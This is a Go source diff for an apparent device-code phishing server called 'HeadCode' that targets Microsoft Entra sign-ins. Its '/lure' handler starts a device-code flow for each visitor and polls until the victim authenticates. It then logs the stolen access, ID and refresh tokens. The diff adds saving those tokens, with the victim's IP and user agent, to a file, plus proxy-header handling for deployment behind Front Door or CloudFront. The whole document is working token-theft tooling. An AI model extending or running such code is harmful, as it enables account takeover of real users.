@@ -76,9 +76,11 @@ var (
 	domain          string
 	certFile        string
 	keyFile         string
-	blocklistFile   string
-	logFile         string
-	tenantInfo      *entra.TenantInfo
+	blocklistFile      string
+	logFile            string
+	tokenFile          string
+	trustedProxyHeader string
+	tenantInfo         *entra.TenantInfo
 )
 
 func init() {
@@ -95,6 +97,8 @@ func init() {
 	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
 	runCmd.Flags().StringVarP(&blocklistFile, "blocklist", "b", "", "Blocklist file containing IP addresses and CIDR ranges to block")
 	runCmd.Flags().StringVarP(&logFile, "log-file", "l", "", "File to write logs to (default is stdout only)")
+	runCmd.Flags().StringVar(&tokenFile, "token-file", "", "File to write captured tokens to (restricted permissions, 0600)")
+	runCmd.Flags().StringVar(&trustedProxyHeader, "trusted-proxy-header", "", "Trusted proxy preset for client IP resolution: frontdoor, cloudfront (default: use RemoteAddr)")
 }
 
 var runCmd = &cobra.Command{
@@ -209,6 +213,9 @@ Examples:
   # With log file
   HeadCode server --log-file dcp_web.log --client-id msteams
 
+  # With token file (tokens written to restricted file, 0600 permissions)
+  HeadCode server --token-file tokens.txt --client-id msteams
+
   # Full example with blocklist and logging
   HeadCode server --blocklist blocklist.txt --log-file dcp_web.log --domain example.com
 
@@ -236,7 +243,7 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 
 		// If log file is specified, add file handler
 		if logFile != "" {
-			file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
+			file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
 			if err != nil {
 				slog.Error("Failed to open log file", "file", logFile, "error", err)
 				os.Exit(1)
@@ -307,12 +314,18 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
 		}
 
+		// Resolve trusted proxy headers
+		trustedHeaders := resolveTrustedHeaders(trustedProxyHeader)
+		if trustedProxyHeader != "" {
+			slog.Info("Trusted proxy header configured", "preset", trustedProxyHeader, "headers", trustedHeaders)
+		}
+
 		// Set up a single resource handler
 		lurePath := pathPrefix
 		if lurePath == "" {
 			lurePath = "/lure"
 		}
-		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent))
+		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent, tokenFile, trustedHeaders))
 
 		host, port, err := net.SplitHostPort(address)
 		if err != nil || port == "" {
@@ -346,7 +359,10 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 
 		// Create a Server instance to listen on port
 		server := &http.Server{
-			Addr: address,
+			Addr:         address,
+			ReadTimeout:  10 * time.Second,
+			WriteTimeout: 30 * time.Second,
+			IdleTimeout:  120 * time.Second,
 		}
 
 		// Initialize blocklist if provided
@@ -363,7 +379,7 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 			bl.StartAutoReload(blocklistFile, 30*time.Second)
 
 			// Create middleware
-			blocklistMiddleware = blocklist.Middleware(bl)
+			blocklistMiddleware = blocklist.Middleware(bl, trustedHeaders)
 			slog.Info("Blocklist enabled", "file", blocklistFile, "autoReload", "30s")
 		}
 
@@ -495,9 +511,9 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 	},
 }
 
-func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
+func getLureHandler(clientId string, userAgent string, tokenFile string, trustedHeaders []string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		realClientIP := blocklist.GetClientIP(r)
+		realClientIP := blocklist.GetClientIP(r, trustedHeaders)
 
 		slog.Info("Lure opened",
 			"clientId", clientId,
@@ -521,16 +537,23 @@ func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
 			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 			return
 		}
-		go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth, realClientIP, r.UserAgent())
+		go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth, realClientIP, r.UserAgent(), tokenFile)
 		http.Redirect(w, r, redirectUri, http.StatusFound)
 	}
 }
 
-func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string) {
+func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string, tokenFile string) {
 	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
+	deadline := time.Now().Add(time.Duration(deviceAuth.ExpiresIn) * time.Second)
 
 	for {
 		time.Sleep(pollInterval)
+
+		if time.Now().After(deadline) {
+			slog.Warn("Device code expired, stopping poll", "userCode", deviceAuth.UserCode)
+			return
+		}
+
 		slog.Info("Checking for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
 		result, err := entra.RequestToken(tenantId, clientId, deviceAuth)
 
@@ -548,8 +571,52 @@ func startPollForToken(tenantId string, clientId string, deviceAuth *entra.Devic
 			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
 			slog.Info("ID TOKEN:", "token", result.IdToken)
 			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
+
+			if tokenFile != "" {
+				writeTokensToFile(tokenFile, result, deviceAuth.UserCode, clientId, clientIP, visitorUserAgent)
+			}
 			return
 		}
+	}
+}
+
+func writeTokensToFile(tokenFile string, result *entra.AuthenticationResult, userCode string, clientId string, clientIP string, visitorUserAgent string) {
+	f, err := os.OpenFile(tokenFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
+	if err != nil {
+		slog.Error("Failed to write tokens to file", "file", tokenFile, "error", err)
+		return
+	}
+	defer f.Close()
+
+	timestamp := time.Now().UTC().Format(time.RFC3339)
+	fmt.Fprintf(f, "=== Token Captured: %s ===\n", timestamp)
+	fmt.Fprintf(f, "UserCode:    %s\n", userCode)
+	fmt.Fprintf(f, "ClientId:    %s\n", clientId)
+	fmt.Fprintf(f, "ClientIP:    %s\n", clientIP)
+	fmt.Fprintf(f, "UserAgent:   %s\n", visitorUserAgent)
+	fmt.Fprintf(f, "AccessToken: %s\n", result.AccessToken)
+	fmt.Fprintf(f, "IdToken:     %s\n", result.IdToken)
+	fmt.Fprintf(f, "RefreshToken:%s\n", result.RefreshToken)
+	fmt.Fprintf(f, "===\n\n")
+
+	slog.Info("Tokens written to file", "file", tokenFile)
+}
+
+func resolveTrustedHeaders(preset string) []string {
+	switch strings.ToLower(preset) {
+	case "frontdoor":
+		// Azure Front Door sets X-Azure-ClientIP and X-Forwarded-For
+		return []string{"X-Azure-ClientIP", "X-Forwarded-For"}
+	case "cloudfront":
+		// AWS CloudFront sets CloudFront-Viewer-Address (ip:port format)
+		// and populates X-Forwarded-For
+		return []string{"CloudFront-Viewer-Address", "X-Forwarded-For"}
+	case "":
+		return nil
+	default:
+		slog.Error("Unknown trusted-proxy-header preset", "preset", preset, "available", "frontdoor, cloudfront")
+		os.Exit(1)
+		return nil
 	}
 }
 
